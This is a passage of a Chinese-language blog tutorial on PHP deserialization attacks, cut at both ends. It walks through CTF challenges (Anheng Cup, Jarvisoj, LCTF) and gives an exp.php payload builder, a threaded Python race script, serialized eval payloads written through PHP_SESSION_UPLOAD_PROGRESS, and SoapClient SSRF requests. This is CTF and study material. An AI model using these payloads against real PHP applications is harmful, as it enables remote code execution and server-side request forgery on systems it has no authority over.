class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-string">&#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;ip);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>问题一</strong></p><p>整个代码没有参数可控的地方。通过什么方法来进行反序列化利用呢</p><p><strong>解答一</strong></p><p>这里，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件。</p><p>另外，与文件包含利用一样，也需要进行竞争。</p><p>首先利用exp.php脚本构造恶意序列化语句</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);session_start();<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Door</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> IP();    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle-&gt;action();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeNow</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的访问时间:&quot;</span>.<span class="hljs-string">&quot;  &quot;</span>.date(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>,time());    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">IP</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">//$this-&gt;ip=&#x27;payload&#x27;;</span>        <span class="hljs-keyword">$this</span>-&gt;ip=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;        <span class="hljs-comment">//$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;</span>    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;ip);    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Door();<span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$c</span>=addslashes(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$d</span>=str_replace(<span class="hljs-string">&quot;O:4:&quot;</span>,<span class="hljs-string">&quot;|O:4:&quot;</span>,<span class="hljs-variable">$c</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>其此利用exp.py脚本进行竞争</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">ip,port</span>):</span>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> *<span class="hljs-number">1024</span>*<span class="hljs-number">1</span>)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        et.wait()        url = <span class="hljs-string">&#x27;http://&#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+<span class="hljs-built_in">str</span>(port)+<span class="hljs-string">&#x27;/test5.php&#x27;</span>        headers = &#123;        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,        <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;PHPSESSID=20190506&#x27;</span>,        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>        &#125;        proxy = &#123;        <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1:8080&#x27;</span>        &#125;        data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;        files=&#123;            <span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">r&#x27;|O:4:\&quot;Door\&quot;:1:&#123;s:6:\&quot;handle\&quot;;O:2:\&quot;IP\&quot;:1:&#123;s:2:\&quot;ip\&quot;;s:10:\&quot;phpinfo();\&quot;;&#125;&#125;&#x27;</span>,f,<span class="hljs-string">&#x27;text/plain&#x27;</span>)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) <span class="hljs-comment">#,proxies=proxy</span>        resp.encoding=<span class="hljs-string">&quot;utf-8&quot;</span>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(resp.text)&lt;<span class="hljs-number">2000</span>:            print(<span class="hljs-string">&#x27;[+++++]retry&#x27;</span>)        <span class="hljs-keyword">else</span>:            print(resp.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))            et.clear()            print(<span class="hljs-string">&#x27;success!&#x27;</span>)            <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    ip=sys.argv[<span class="hljs-number">1</span>]    port=<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])    et=threading.Event()    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):        threading.Thread(target=exp,args=(ip,port)).start()    et.<span class="hljs-built_in">set</span>()</code></pre></div><p>本地实测没有成功，session写入有问题。</p><h3 id="例子1：写入session文件后反序列化"><a href="#例子1：写入session文件后反序列化" class="headerlink" title="例子1：写入session文件后反序列化"></a>例子1：写入session文件后反序列化</h3><h4 id="安恒杯"><a href="#安恒杯" class="headerlink" title="安恒杯"></a>安恒杯</h4><p><strong>class.php</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_string(file_get_contents(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])));<span class="hljs-comment">//show_source(__FILE__);</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-string">&quot;index.php&quot;</span>; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;varr))&#123;   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;文件&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;varr.<span class="hljs-string">&quot;存在&lt;br&gt;&quot;</span>;  &#125;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>; &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>; <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-string">&#x27;1234567890&#x27;</span>;  <span class="hljs-keyword">$this</span>-&gt;obj = <span class="hljs-literal">null</span>; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">$this</span>-&gt;obj-&gt;execute();  <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;varr; &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>; &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;varr); &#125; <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>; &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>index.php</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;./class.php&quot;</span>);session_start();<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> foo1();<span class="hljs-variable">$obj</span>-&gt;varr = <span class="hljs-string">&quot;phpinfo.php&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>先构造链子</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//require_once &quot;class.php&quot;;</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$varr</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-variable">$varr</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;obj = <span class="hljs-variable">$obj</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$varr</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$varr</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;varr = <span class="hljs-variable">$varr</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> foo1(<span class="hljs-keyword">new</span> foo2(<span class="hljs-keyword">new</span> foo3(<span class="hljs-string">&quot;phpinfo();&quot;</span>)));<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>),<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">//O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:0:&quot;&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</span></code></pre></div><p>写入的方式主要是利用PHP中<a href="http://php.net/manual/en/session.upload-progress.php">Session Upload Progress</a>来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：</p><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p>最终写入的内容：</p><div class="hljs code-wrapper"><pre><code class="hljs php">|O:<span class="hljs-number">4</span>:\<span class="hljs-string">&quot;foo1\&quot;:1:&#123;s:4:\&quot;varr\&quot;;O:4:\&quot;foo2\&quot;:2:&#123;s:4:\&quot;varr\&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;obj\&quot;;O:4:\&quot;foo3\&quot;:1:&#123;s:4:\&quot;varr\&quot;;s:12:\&quot;var_dump(1);\&quot;;&#125;&#125;&#125;</span></code></pre></div><p>需要注意的是，在这道题的实践中发现，ini_set无法改变PHP_SESSION_UPLOAD_PROGRESS时序列化的方式，只有当php.ini文件中session.serialize_handler设置为php_serialize才能够以我们想要的格式存入session文件，再次访问index.php时，ini_set将反序列化引擎设置为php，这时候可以以php方式反序列化session文件。</p><p>另外，这道题没有开启cleanup，php中默认开启。如果开启后，可以使用条件竞争进行触发。</p><h4 id="Jarvisoj-Web"><a href="#Jarvisoj-Web" class="headerlink" title="Jarvisoj Web"></a>Jarvisoj Web</h4><blockquote><p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//A webshell is wait for you</span>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);session_start();<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))&#123;    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();&#125;<span class="hljs-keyword">else</span>&#123;    highlight_string(file_get_contents(<span class="hljs-string">&#x27;sessiontest.php&#x27;</span>));&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>查看phpinfo中的几个关键值</p><ul><li><p>session.use_strict_mode    Off 表示我们可以控制session文件名</p></li><li><p>session.upload_progress.enabled    On 表示我们可以通过文件上传写入session文件</p></li><li><p>session.upload_progress.cleanup    Off 表示在上传成功后不会删除session文件，所以这道题不需要条件竞争</p></li><li><p>session.upload_progress.name    PHP_SESSION_UPLOAD_PROGRESS 默认值</p></li></ul><p>构造POST提交表单</p><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;123&quot;</span> /&gt;    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> /&gt;&lt;/form&gt;</code></pre></div><p>payload：</p><div class="hljs code-wrapper"><pre><code class="hljs php">|O:<span class="hljs-number">5</span>:\<span class="hljs-string">&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911152146508.png" alt="image-20200911152146508"></p><ul><li>filename防止出错应该对双引号进行转义</li><li>再次访问的时候别忘了加上sessionid，不然每次都是新的session </li></ul><p><strong>python 脚本</strong></p><div class="hljs code-wrapper"><pre><code class="hljs plain"></code></pre></div><h3 id="例子2：配合call-user-func修改session配置"><a href="#例子2：配合call-user-func修改session配置" class="headerlink" title="例子2：配合call_user_func修改session配置"></a>例子2：配合call_user_func修改session配置</h3><h4 id="LCTF-签到题"><a href="#LCTF-签到题" class="headerlink" title="LCTF 签到题"></a>LCTF 签到题</h4><ul><li>利用回调函数来覆盖session默认的序列化引擎。</li><li>序列化到原生类Soap对象，将序列化语句写入session文件</li><li>b变量覆盖为call_user_func。</li><li>利用将对象与其方法构造成一个数组来进行函数调用，使得调用该对象的成员方法。这里是调用Soap的welcome_to_the_lctf2018方法，自然会触发__call</li><li>触发__call方法进行SSRF访问flag.php.</li><li>将flag写入session。题目会将session打印出来。</li></ul><p>获取Soap对象的序列化语句</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$url</span>));<span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span> . urlencode(<span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>burp发送</p><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/web/LCTF2018/babyrevenge/index.php?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A38%3A%22http%3A%2F%2F127.0.0.1%2Fweb%2FLCTF2018%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A38%3A%22http%3A%2F%2F127.0.0.1%2Fweb%2FLCTF2018%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.22<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=rbtgu59dmpicqgk0ffkunogg1l<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31serialize_handler=php_serialize</code></pre></div><p>直接访问</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200828153146285.png" alt="image-20200828153146285"></p><p>已经反序列化成了soap对象</p><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/web/LCTF2018/babyrevenge/?f=extract&amp;name=SoapClient</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.22<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=rbtgu59dmpicqgk0ffkunogg1l; XDEBUG_SESSION=PHPSTORM<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16b=call_user_func</code></pre></div><p>再次访问可以触发soap，但是我本地环境一直不成功。</p><h2 id="0x06-php反序列化扩展原生类利用"><a href="#0x06-php反序列化扩展原生类利用" class="headerlink" title="0x06 php反序列化扩展原生类利用"></a>0x06 php反序列化扩展原生类利用</h2><p><strong>查看php原生内置类的魔术方法。</strong>此脚本稍作修改既可用于查找原生类中的同名函数。</p><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$classes</span> = get_declared_classes();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;    <span class="hljs-variable">$methods</span> = get_class_methods(<span class="hljs-variable">$class</span>);    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(            <span class="hljs-string">&#x27;__destruct&#x27;</span>,            <span class="hljs-string">&#x27;__toString&#x27;</span>,            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,            <span class="hljs-string">&#x27;__call&#x27;</span>,            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,            <span class="hljs-string">&#x27;__get&#x27;</span>,            <span class="hljs-string">&#x27;__set&#x27;</span>,            <span class="hljs-string">&#x27;__isset&#x27;</span>,            <span class="hljs-string">&#x27;__unset&#x27;</span>,            <span class="hljs-string">&#x27;__invoke&#x27;</span>,            <span class="hljs-string">&#x27;__set_state&#x27;</span>        ))) &#123;            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><p>结果：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span>::__wakeup<span class="hljs-built_in">Exception</span>::__toString<span class="hljs-built_in">ErrorException</span>::__wakeup<span class="hljs-built_in">ErrorException</span>::__toString<span class="hljs-built_in">Error</span>::__wakeup<span class="hljs-built_in">Error</span>::__toString<span class="hljs-built_in">ParseError</span>::__wakeup<span class="hljs-built_in">ParseError</span>::__toString<span class="hljs-built_in">TypeError</span>::__wakeup<span class="hljs-built_in">TypeError</span>::__toString<span class="hljs-built_in">ArithmeticError</span>::__wakeup<span class="hljs-built_in">ArithmeticError</span>::__toString<span class="hljs-built_in">DivisionByZeroError</span>::__wakeup<span class="hljs-built_in">DivisionByZeroError</span>::__toString<span class="hljs-built_in">Generator</span>::__wakeupClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeupDateTime::__set_stateDateTimeImmutable::__wakeupDateTimeImmutable::__set_stateDateTimeZone::__wakeupDateTimeZone::__set_stateDateInterval::__wakeupDateInterval::__set_stateDatePeriod::__wakeupDatePeriod::__set_state<span class="hljs-built_in">LogicException</span>::__wakeup<span class="hljs-built_in">LogicException</span>::__toString<span class="hljs-built_in">BadFunctionCallException</span>::__wakeup<span class="hljs-built_in">BadFunctionCallException</span>::__toString<span class="hljs-built_in">BadMethodCallException</span>::__wakeup<span class="hljs-built_in">BadMethodCallException</span>::__toString<span class="hljs-built_in">DomainException</span>::__wakeup<span class="hljs-built_in">DomainException</span>::__toString<span class="hljs-built_in">InvalidArgumentException</span>::__wakeup<span class="hljs-built_in">InvalidArgumentException</span>::__toString<span class="hljs-built_in">LengthException</span>::__wakeup<span class="hljs-built_in">LengthException</span>::__toString<span class="hljs-built_in">OutOfRangeException</span>::__wakeup<span class="hljs-built_in">OutOfRangeException</span>::__toString<span class="hljs-built_in">RuntimeException</span>::__wakeup<span class="hljs-built_in">RuntimeException</span>::__toString<span class="hljs-built_in">OutOfBoundsException</span>::__wakeup<span class="hljs-built_in">OutOfBoundsException</span>::__toString<span class="hljs-built_in">OverflowException</span>::__wakeup<span class="hljs-built_in">OverflowException</span>::__toString<span class="hljs-built_in">RangeException</span>::__wakeup<span class="hljs-built_in">RangeException</span>::__toString<span class="hljs-built_in">UnderflowException</span>::__wakeup<span class="hljs-built_in">UnderflowException</span>::__toString<span class="hljs-built_in">UnexpectedValueException</span>::__wakeup<span class="hljs-built_in">UnexpectedValueException</span>::__toString<span class="hljs-built_in">CachingIterator</span>::__toString<span class="hljs-built_in">RecursiveCachingIterator</span>::__toString<span class="hljs-built_in">SplFileInfo</span>::__toString<span class="hljs-built_in">DirectoryIterator</span>::__toString<span class="hljs-built_in">FilesystemIterator</span>::__toString<span class="hljs-built_in">RecursiveDirectoryIterator</span>::__toString<span class="hljs-built_in">GlobIterator</span>::__toString<span class="hljs-built_in">SplFileObject</span>::__toString<span class="hljs-built_in">SplTempFileObject</span>::__toString<span class="hljs-built_in">SplFixedArray</span>::__wakeupReflectionException::__wakeupReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionExtension::__toStringReflectionZendExtension::__toString<span 